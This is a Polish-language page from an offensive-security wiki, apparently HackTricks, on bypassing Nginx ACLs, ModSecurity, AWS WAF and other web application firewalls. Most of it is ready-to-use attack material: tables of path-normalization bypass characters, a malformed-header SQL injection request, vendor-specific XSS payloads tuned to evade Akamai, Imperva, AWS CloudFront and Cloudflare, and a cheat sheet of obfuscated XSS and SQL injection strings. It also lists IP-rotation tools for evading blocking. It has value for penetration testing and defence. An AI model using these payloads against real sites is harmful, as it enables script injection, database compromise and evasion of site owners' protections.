# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Ominięcie reguł ACL Nginx za pomocą manipulacji ścieżką <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Techniki [z tych badań](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Przykład reguły Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Aby zapobiec obejściom, Nginx wykonuje normalizację ścieżek przed jej sprawdzeniem. Jednak jeśli serwer zaplecza wykonuje inną normalizację (usuwając znaki, których Nginx nie usuwa), może być możliwe obejście tej obrony.

### **NodeJS - Express**

| Wersja Nginx | **Znaki do obejścia Node.js** |
| ------------- | ------------------------------- |
| 1.22.0        | `\xA0`                          |
| 1.21.6        | `\xA0`                          |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`          |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`          |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`          |

### **Flask**

| Wersja Nginx | **Znaki do obejścia Flask**                                      |
| ------------- | --------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                  |
| 1.21.6        | `\x85`, `\xA0`                                                  |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Wersja Nginx | **Znaki do obejścia Spring Boot** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Konfiguracja Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx jest skonfigurowany, aby blokować dostęp do `/admin.php`, ale można to obejść, uzyskując dostęp do `/admin.php/index.php`.

### Jak zapobiegać
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**W tym poście**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) wyjaśniono, że ModSecurity v3 (do 3.0.12) **nieprawidłowo zaimplementował zmienną `REQUEST_FILENAME`**, która miała zawierać dostępny path (do początku parametrów). Dzieje się tak, ponieważ przeprowadzał dekodowanie URL, aby uzyskać path.\
Dlatego żądanie takie jak `http://example.com/foo%3f';alert(1);foo=` w mod security będzie zakładać, że path to tylko `/foo`, ponieważ `%3f` jest przekształcane w `?`, kończąc path URL, ale w rzeczywistości path, który otrzyma serwer, będzie `/foo%3f';alert(1);foo=`.

Zmienna `REQUEST_BASENAME` i `PATH_INFO` również były dotknięte tym błędem.

Coś podobnego miało miejsce w wersji 2 Mod Security, która pozwalała na obejście ochrony, która uniemożliwiała użytkownikom dostęp do plików z określonymi rozszerzeniami związanymi z plikami kopii zapasowej (takimi jak `.bak`), po prostu wysyłając kropkę zakodowaną w URL jako `%2e`, na przykład: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[To badanie](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) wspomina, że możliwe było obejście reguł AWS WAF stosowanych do nagłówków HTTP, wysyłając "nieprawidłowy" nagłówek, który nie był prawidłowo analizowany przez AWS, ale był przez serwer zaplecza.

Na przykład, wysyłając następujące żądanie z SQL injection w nagłówku X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Możliwe było ominięcie AWS WAF, ponieważ nie rozumiał, że następna linia jest częścią wartości nagłówka, podczas gdy serwer NODEJS to rozumiał (to zostało naprawione).

## Ogólne omijanie WAF

### Limity rozmiaru żądania

Zwykle WAF-y mają określony limit długości żądań do sprawdzenia, a jeśli żądanie POST/PUT/PATCH jest większe, WAF nie sprawdzi żądania.

- Dla AWS WAF, możesz [**sprawdzić dokumentację**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksymalny rozmiar ciała żądania sieciowego, które może być sprawdzane dla ochrony Application Load Balancer i AWS AppSync</td><td>8 KB</td></tr><tr><td>Maksymalny rozmiar ciała żądania sieciowego, które może być sprawdzane dla ochrony CloudFront, API Gateway, Amazon Cognito, App Runner i Verified Access**</td><td>64 KB</td></tr></tbody></table>

- Z [**dokumentacji Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Starsze zapory aplikacji internetowych z Core Rule Set 3.1 (lub niższym) pozwalają na wiadomości większe niż **128 KB** poprzez wyłączenie inspekcji ciała żądania, ale te wiadomości nie będą sprawdzane pod kątem podatności. W nowszych wersjach (Core Rule Set 3.2 lub nowszych) to samo można osiągnąć, wyłączając maksymalny limit ciała żądania. Gdy żądanie przekracza limit rozmiaru:

Jeśli **tryb zapobiegania**: Rejestruje i blokuje żądanie.\
Jeśli **tryb wykrywania**: Sprawdza do limitu, ignoruje resztę i rejestruje, jeśli `Content-Length` przekracza limit.

- Z [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Domyślnie WAF sprawdza tylko pierwsze 8KB żądania. Może zwiększyć limit do 128KB, dodając zaawansowane metadane.

- Z [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Do 128KB.

### Obfuskacja <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Zgodność z Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

W zależności od implementacji normalizacji Unicode (więcej informacji [tutaj](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), znaki, które mają zgodność z Unicode, mogą być w stanie obejść WAF i wykonać zamierzony ładunek. Zgodne znaki można znaleźć [tutaj](https://www.compart.com/en/unicode).

#### Przykład <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Obejście kontekstowych WAF-ów za pomocą kodowania <a href="#ip-rotation" id="ip-rotation"></a>

Jak wspomniano w [**tym wpisie na blogu**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), aby obejść WAF-y, które są w stanie utrzymać kontekst danych wejściowych użytkownika, możemy nadużyć technik WAF, aby faktycznie znormalizować dane wejściowe użytkownika.

Na przykład, w poście wspomniano, że **Akamai zdekodował dane wejściowe użytkownika 10 razy**. Dlatego coś takiego jak `<input/%2525252525252525253e/onfocus` będzie widziane przez Akamai jako `<input/>/onfocus`, co **może być uznane za poprawne, ponieważ tag jest zamknięty**. Jednakże, dopóki aplikacja nie zdekoduje danych wejściowych 10 razy, ofiara zobaczy coś takiego jak `<input/%25252525252525253e/onfocus`, co **wciąż jest ważne dla ataku XSS**.

Dlatego pozwala to na **ukrywanie ładunków w zakodowanych komponentach**, które WAF zdekoduje i zinterpretuje, podczas gdy ofiara tego nie zrobi.

Co więcej, można to zrobić nie tylko z ładunkami zakodowanymi w URL, ale także z innymi kodowaniami, takimi jak unicode, hex, octal...

W poście zasugerowano następujące ostateczne obejścia:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Wspomniano również, że w zależności od **tego, jak niektóre WAF-y rozumieją kontekst** danych wejściowych użytkownika, może być możliwe ich nadużycie. Proponowany przykład w blogu to to, że Akamai pozwalał na umieszczanie czegokolwiek między `/*` a `*/` (potencjalnie dlatego, że jest to powszechnie używane jako komentarze). Dlatego SQLinjection, takie jak `/*'or sleep(5)-- -*/`, nie zostanie wykryte i będzie ważne, ponieważ `/*` jest początkowym ciągiem iniekcji, a `*/` jest skomentowane.

Tego rodzaju problemy z kontekstem mogą być również używane do **nadużywania innych podatności niż ta, która jest oczekiwana** do wykorzystania przez WAF (np. może to być również użyte do wykorzystania XSS).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### Rotacja IP <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generuj URL bramy API do użycia z ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Podobne do fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Wtyczka Burp Suite, która używa IP bramy API
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Dynamically determined number of container instances are activated based on the input file size and split factor, with the input split into chunks for parallel execution, such as 100 instances processing 100 chunks from a 10,000-line input file with a split factor of 100 lines.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Obejścia Regex

Różne techniki mogą być używane do obejścia filtrów regex na zaporach. Przykłady obejmują naprzemienną wielkość liter, dodawanie łamań linii i kodowanie ładunków. Zasoby dotyczące różnych obejść można znaleźć na [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) oraz [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Przykłady poniżej zostały zaczerpnięte z [tego artykułu](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Narzędzia

- [**nowafpls**](https://github.com/assetnote/nowafpls): Wtyczka Burp do dodawania niepotrzebnych danych do żądań w celu obejścia WAF-ów przez długość

## Odniesienia

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)


{{#include ../banners/hacktricks-training.md}}
